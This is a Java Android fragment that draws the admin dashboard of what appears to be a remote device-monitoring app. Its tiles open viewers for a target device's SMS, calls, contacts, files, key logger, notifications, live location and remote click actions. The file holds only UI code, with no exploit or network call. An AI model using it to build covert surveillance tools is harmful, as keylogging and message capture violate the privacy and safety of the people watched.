package com.vikasyadavnsit.cdc.fragment;

import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.utils.CommonUtil;

import java.util.function.Function;
import java.util.function.Supplier;

public class AdminViewersFragment extends Fragment {

    private static final String ARG_USER = "arg_user";
    private User userDetails;

    private static class ViewerTile {
        final String icon, title, description;
        final Function<User, Fragment> factory;

        ViewerTile(String icon, String title, String description, Function<User, Fragment> factory) {
            this.icon = icon;
            this.title = title;
            this.description = description;
            this.factory = factory;
        }

        // Overload for fragments that don't need User data
        ViewerTile(String icon, String title, String description, Supplier<Fragment> supplier) {
            this(icon, title, description, user -> supplier.get());
        }
    }

    private static final ViewerTile[] VIEWER_TILES = {
            new ViewerTile("📱", "Remote Actions",
                    "Send and manage automated click sequences or commands to the user's device",
                    RemoteTriggerClickActionsFragment::new),
            new ViewerTile("✉", "Set Message",
                    "Send a personalized message to be displayed on the user's device",
                    AdminMessageFragment::newInstance),
            new ViewerTile("💬", "SMS Logs",
                    "Browse all captured incoming and outgoing SMS messages",
                    AdminSmsFragment::new),
            new ViewerTile("📞", "Call History",
                    "View all incoming, outgoing, and missed call records",
                    AdminCallLogsFragment::new),
            new ViewerTile("👥", "Contacts",
                    "See the complete contact list saved on the remote device",
                    AdminContactsFragment::new),
            new ViewerTile("📡", "Sensor Data",
                    "Live view of device sensors like Accelerometer, GPS, and Battery",
                    AdminSensorsFragment::new),
            new ViewerTile("🗂", "Files",
                    "Explore the directory structure and storage of the target device",
                    AdminFileStructureFragment::new),
            new ViewerTile("⌨", "Key Logger",
                    "View a history of typed text and keyboard inputs organized by app",
                    KeyStrokesFragment::new),
            new ViewerTile("🔔", "Notifications",
                    "Track real-time notifications and messages received on the remote device",
                    AccessibilityNotificationFragment::new),
            new ViewerTile("📊", "App Usage",
                    "See how much time is spent on different apps and track usage patterns",
                    SystemAppUsageStatisticsFragment::new),
            new ViewerTile("🔌", "Offline Tester",
                    "Test and run action protocols locally on this device for debugging",
                    OfflineClickActionsFragment::new),
            new ViewerTile("📍", "Live Location",
                    "View the device's real-time GPS location on a map",
                    LiveLocationFragment::new),
    };

    public static AdminViewersFragment newInstance(User userDetails) {
        AdminViewersFragment fragment = new AdminViewersFragment();
        Bundle args = new Bundle();
        args.putSerializable(ARG_USER, userDetails);
        fragment.setArguments(args);
        return fragment;
    }

    private void setupHeaderField(View root, int viewId, String prefix, Object value) {
        TextView textView = root.findViewById(viewId);
        if (textView != null) {
            textView.setText(prefix + ": " + (value != null ? value.toString() : "Unknown"));
        }
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        if (getArguments() != null) {
            userDetails = (User) getArguments().getSerializable(ARG_USER);
        }

        View view = inflater.inflate(R.layout.fragment_admin_viewers, container, false);

        setupHeaderField(view, R.id.admin_viewers_device_manufacturer, "Manufacturer", userDetails.getDeviceDetails().get("manufacturer"));
        setupHeaderField(view, R.id.admin_viewers_device_brand, "Brand", userDetails.getDeviceDetails().get("brand"));
        setupHeaderField(view, R.id.admin_viewers_device_owner, "Owner", userDetails.getFullName());
        setupHeaderField(view, R.id.admin_viewers_device_id, "Android ID", userDetails.getDeviceDetails().get("androidId"));

        GridLayout adminGrid = view.findViewById(R.id.admin_viewers_grid);
        adminGrid.setColumnCount(calculateNoOfColumns());
        for (ViewerTile tile : VIEWER_TILES) {
            adminGrid.addView(buildViewerTile(tile));
        }

        return view;
    }

    // ── Admin viewer tiles ────────────────────────────────

    private LinearLayout buildViewerTile(ViewerTile viewer) {
        LinearLayout tile = new LinearLayout(getContext());
        tile.setOrientation(LinearLayout.VERTICAL);
        tile.setLayoutParams(createGroupLayoutParams());
        tile.setPadding(dp(16), dp(16), dp(16), dp(16));
        tile.setBackgroundResource(R.drawable.group_border);

        LinearLayout header = new LinearLayout(getContext());
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams headerParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        headerParams.setMargins(0, 0, 0, dp(10));
        header.setLayoutParams(headerParams);

        GradientDrawable iconBg = new GradientDrawable();
        iconBg.setShape(GradientDrawable.OVAL);
        iconBg.setColor(requireContext().getColor(R.color.primary_container));

        TextView icon = new TextView(getContext());
        icon.setText(viewer.icon);
        icon.setTextSize(14f);
        icon.setGravity(Gravity.CENTER);
        icon.setBackground(iconBg);
        int iconSize = dp(30);
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(iconSize, iconSize);
        iconParams.setMarginEnd(dp(10));
        icon.setLayoutParams(iconParams);

        TextView title = new TextView(getContext());
        title.setText(viewer.title);
        title.setTextColor(requireContext().getColor(R.color.text_primary));
        title.setTextSize(14f);
        title.setTypeface(null, Typeface.BOLD);
        title.setLayoutParams(new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));

        header.addView(icon);
        header.addView(title);
        tile.addView(header);

        View divider = new View(getContext());
        divider.setBackgroundColor(requireContext().getColor(R.color.divider));
        LinearLayout.LayoutParams divParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(1));
        divParams.setMargins(0, 0, 0, dp(10));
        divider.setLayoutParams(divParams);
        tile.addView(divider);

        TextView desc = new TextView(getContext());
        desc.setText(viewer.description);
        desc.setTextColor(requireContext().getColor(R.color.shayari_text_secondary));
        desc.setTextSize(13f);
        desc.setLineSpacing(0, 1.4f);
        LinearLayout.LayoutParams descParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        descParams.setMargins(0, 0, 0, dp(14));
        desc.setLayoutParams(descParams);
        tile.addView(desc);

        Button button = new Button(getContext());
        button.setText("Open");
        button.setBackgroundResource(R.drawable.button_action);
        button.setTextColor(requireContext().getColor(R.color.on_primary));
        button.setTextSize(13f);
        button.setAllCaps(false);
        button.setLetterSpacing(0.03f);
        button.setPadding(dp(12), dp(10), dp(12), dp(10));
        button.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        button.setOnClickListener(v ->
                CommonUtil.loadFragmentWithBackStack(getParentFragmentManager(), viewer.factory.apply(userDetails)));
        tile.addView(button);

        return tile;
    }

    // ── Helpers ───────────────────────────────────────────

    private int calculateNoOfColumns() {
        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
        float dpWidth = displayMetrics.widthPixels / displayMetrics.density;
        int noOfColumns = (int) (dpWidth / 300);
        return Math.max(1, Math.min(noOfColumns, 3));
    }

    private GridLayout.LayoutParams createGroupLayoutParams() {
        GridLayout.LayoutParams p = new GridLayout.LayoutParams();
        p.width = 0;
        p.height = GridLayout.LayoutParams.WRAP_CONTENT;
        p.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
        p.setMargins(dp(8), dp(8), dp(8), dp(8));
        return p;
    }

    private int dp(int value) {
        return (int) (value * getResources().getDisplayMetrics().density);
    }
}
